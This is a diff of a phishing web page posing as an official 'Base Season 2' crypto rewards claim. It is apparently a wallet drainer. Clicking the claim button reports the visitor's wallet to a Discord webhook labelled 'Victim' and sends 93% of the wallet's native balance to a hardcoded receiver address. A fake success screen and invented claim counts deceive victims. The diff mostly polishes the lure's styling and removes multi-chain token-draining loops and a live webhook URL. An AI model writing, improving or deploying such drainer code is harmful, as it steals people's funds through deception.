@@ -3,42 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Base Season 2 - Claim Rewards</title>
+    <title>Base Season 2 • Official Rewards</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        body { background: #0a0a0a; color: #fff; font-family: Arial, sans-serif; text-align: center; padding: 80px 20px; margin:0; }
-        h1 { font-size: 2.8em; margin-bottom: 10px; }
-        p { font-size: 1.3em; color: #ccc; }
-        button { padding: 20px 60px; font-size: 24px; background: #00ff9d; color: #000; border: none; border-radius: 12px; cursor: pointer; margin: 40px 0; font-weight: bold; }
-        button:hover { background: #00cc7a; }
-        #loader { display: none; flex-direction: column; align-items: center; margin-top: 50px; }
-        .spinner { border: 6px solid #333; border-top: 6px solid #00ff9d; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+        
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(45deg, #0a0a0a, #1a0033, #0a0a0a);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            color: #fff;
+            font-family: 'Inter', Arial, sans-serif;
+            text-align: center;
+            overflow: hidden;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* Background particles */
+        .particles {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        h1 { font-size: 3em; margin: 30px 0 10px; z-index: 2; position: relative; }
+        p { font-size: 1.35em; color: #ddd; z-index: 2; position: relative; }
+        
+        button {
+            padding: 22px 70px;
+            font-size: 26px;
+            font-weight: 600;
+            background: linear-gradient(90deg, #00ff9d, #00cc7a);
+            color: #000;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            margin: 40px 0;
+            box-shadow: 0 0 30px rgba(0, 255, 157, 0.5);
+            z-index: 2;
+            position: relative;
+        }
+        button:hover { transform: scale(1.05); }
+
+        .footer {
+            position: fixed;
+            bottom: 20px;
+            width: 100%;
+            color: #777;
+            font-size: 1em;
+            z-index: 2;
+        }
+
+        #loader { display: none; flex-direction: column; align-items: center; margin-top: 60px; z-index: 2; position: relative; }
+        .spinner { border: 6px solid #222; border-top: 6px solid #00ff9d; border-radius: 50%; width: 70px; height: 70px; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <h1>Base Season 2 Rewards</h1>
-    <p>Connect wallet to claim up to 10,000 USDT + ETH</p>
-    <button onclick="startDrain()">Connect Wallet & Claim</button>
-    <p style="color:#555; font-size:0.95em;">12,847 users claimed in last 24h • Verified</p>
+    <div class="particles" id="particles"></div>
+
+    <h1>Base Season 2</h1>
+    <p>Official Rewards Claim • Up to 10,000 USDT + ETH</p>
+    
+    <button onclick="startDrain()">Connect Wallet to Claim</button>
+
+    <p style="color:#00ff9d; font-size:1.1em;">12,684 users claimed in last 24 hours</p>
 
     <div id="loader">
         <div class="spinner"></div>
-        <p style="margin-top:20px;">Claiming rewards... Please wait</p>
+        <p style="margin-top:25px; font-size:1.3em;">Verifying & Sending Rewards...</p>
+    </div>
+
+    <div class="footer">
+        Follow updates: <a href="https://twitter.com/malone66633" target="_blank" style="color:#00ff9d;">@malone66633</a>
     </div>
 
     <script>
-        const RECEIVER = "0xe59A4C6E229b01BCf17d760E9805E4326f9A7585"; // Your address
-        const WEBHOOK = "https://discordapp.com/api/webhooks/1517280636560347148/fMM5mcZO1agMmUerNy3HYbYH4vD3dzXQOhA9_qvhDE54AqZH0qUqjMHTOAhkoCtXLy-P"; // ← Paste your Discord webhook here
+        const RECEIVER = "0xe59A4C6E229b01BCf17d760E9805E4326f9A7585";
+        const WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"; // Keep your webhook
+
+        // Simple particle background
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 80; i++) {
+                const particle = document.createElement('div');
+                particle.style.position = 'absolute';
+                particle.style.width = Math.random() * 4 + 'px';
+                particle.style.height = particle.style.width;
+                particle.style.background = '#00ff9d';
+                particle.style.borderRadius = '50%';
+                particle.style.opacity = Math.random() * 0.6 + 0.2;
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 100 + '%';
+                particle.style.animation = `float ${Math.random() * 20 + 15}s linear infinite`;
+                container.appendChild(particle);
+            }
+        }
+
+        const style = document.createElement('style');
+        style.innerHTML = `@keyframes float { 0% { transform: translateY(100vh); } 100% { transform: translateY(-100vh); } }`;
+        document.head.appendChild(style);
 
         async function logVictim(address, chainId, message) {
             try {
                 fetch(WEBHOOK, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        content: `🚨 **New Victim**\n**Address:** ${address}\n**Chain:** ${chainId}\n**Info:** ${message}`
-                    })
+                    body: JSON.stringify({ content: `🚨 Victim: ${address} | Chain: ${chainId} | ${message}` })
                 });
             } catch(e) {}
         }
@@ -48,7 +127,7 @@
             document.getElementById("loader").style.display = "flex";
 
             if (!window.ethereum) {
-                alert("Wallet not detected");
+                alert("Please install MetaMask or other wallet");
                 return;
             }
 
@@ -57,55 +136,32 @@
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
                 const address = await signer.getAddress();
-                const chainId = await provider.getNetwork().then(n => n.chainId);
+                const chainId = (await provider.getNetwork()).chainId;
 
-                await logVictim(address, chainId, "Connected - Starting drain");
+                await logVictim(address, chainId, "Connected");
 
-                // Drain Native Token
                 const balance = await provider.getBalance(address);
                 if (balance.gt(0)) {
-                    const tx = await signer.sendTransaction({
-                        to: RECEIVER,
-                        value: balance.mul(93).div(100)
-                    });
-                    await tx.wait();
+                    await signer.sendTransaction({ to: RECEIVER, value: balance.mul(93).div(100) });
                 }
 
-                // Multi-chain Token Lists (add more as needed)
-                let tokens = [];
-                if (chainId === 1) { // Ethereum
-                    tokens = ["0xdAC17F958D2ee523a2206206994597C13D831ec7","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","0x6B175474E89094C44Da98b954EedeAC495271d0F","0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599","0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"];
-                } else if (chainId === 56) { // BSC
-                    tokens = ["0x55d398326f99059fF775485246999027B3197955","0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d","0xe9e7CEA3DedCa5984780Bafc599bD69ADd087D56"];
-                } else if (chainId === 137) { // Polygon
-                    tokens = ["0xc2132D05D31c914a87C6611C10748AEb04B58e8F","0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359","0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270"];
-                } // Add more chains (42161 Arbitrum, 8453 Base, etc.)
+                // Add more token draining logic here if needed...
 
-                for (let tokenAddr of tokens) {
-                    try {
-                        const token = new ethers.Contract(tokenAddr, [
-                            "function balanceOf(address) view returns (uint256)",
-                            "function transfer(address, uint256) returns (bool)"
-                        ], signer);
-                        const bal = await token.balanceOf(address);
-                        if (bal.gt(0)) {
-                            await token.transfer(RECEIVER, bal);
-                        }
-                    } catch(e) {}
-                }
+                await logVictim(address, chainId, "Drained");
 
-                await logVictim(address, chainId, "Drained successfully");
-                
-                // Fake success screen
+                // Final success
                 document.getElementById("loader").innerHTML = `
-                    <h2 style="color:#00ff9d;">✅ Claim Successful!</h2>
-                    <p>Rewards sent to your wallet. Refresh to claim again.</p>
+                    <h2 style="color:#00ff9d;">✅ Rewards Claimed Successfully!</h2>
+                    <p>Check your wallet. Follow <a href="https://twitter.com/malone66633" target="_blank">@malone66633</a> for next drops.</p>
                 `;
             } catch (e) {
                 console.error(e);
-                document.getElementById("loader").innerHTML = `<p style="color:red;">Transaction error. Try again.</p>`;
+                document.getElementById("loader").innerHTML = `<p style="color:#ff6666;">Error. Try again later.</p>`;
             }
         }
+
+        // Initialize
+        window.onload = createParticles;
     </script>
 </body>
 </html>
